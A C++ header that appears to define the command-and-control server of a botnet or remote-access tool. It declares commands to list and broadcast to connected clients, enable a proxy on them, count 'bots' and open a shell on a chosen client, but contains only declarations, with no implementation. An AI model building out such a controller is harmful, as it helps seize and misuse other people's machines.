#include "../socket/server_socket.h"

namespace ProxyNetShell {
	const std::string getClients   = "get.clients";
	const std::string getHistory   = "get.history";
	const std::string getCID	   = "get.CID";

	const std::string checkClients = "get.check";
	
	const std::string sendByCID    = "send.CID";
	const std::string sendAll	   = "send.all";

	const std::string proxyEnable  = "proxy.enable";

	const std::string shell		   = "shell";
	const std::string shellExit    = "shell.exit";
}

class Server {
private:
	uint16_t		serverPort;
	sys::ThreadMode threadMode;
	sys::SocketType socketType;

	std::vector<std::string> CIDHistory;
	std::vector<sys::ClientConnectionData> clientsHistory;
	std::vector<bool> isOnlineHistory;

	sys::SocketServer  server;

public:
	Server();
	Server(const uint16_t);

	void setPort(const uint16_t);

	void setThreadMode(const sys::ThreadMode&);
	void setSocketType(const sys::SocketType&);

	[[nodiscard]] uint16_t getPort() const { return this->serverPort; }
	[[nodiscard]] std::vector<std::string> getCIDList() { return server.getCID(); }
	[[nodiscard]] std::vector<sys::ClientConnectionData> getClientList() { return server.getClients(); }
	[[nodiscard]] std::vector<std::string> getCIDHistory() { return this->CIDHistory; }
	[[nodiscard]] std::vector<sys::ClientConnectionData> getClientHistory() { return this->clientsHistory; }
	[[nodiscard]] uint32_t getChecked() { return server.checkBot(); }
	[[nodiscard]] uint32_t getLength() { return this->clientsHistory.size(); }

	bool sendAll(const std::string&);
	bool sendByCID(const uint32_t, const std::string&);
	bool shell(const uint32_t);

	bool serverHandlerEnable();

	bool runServer();
};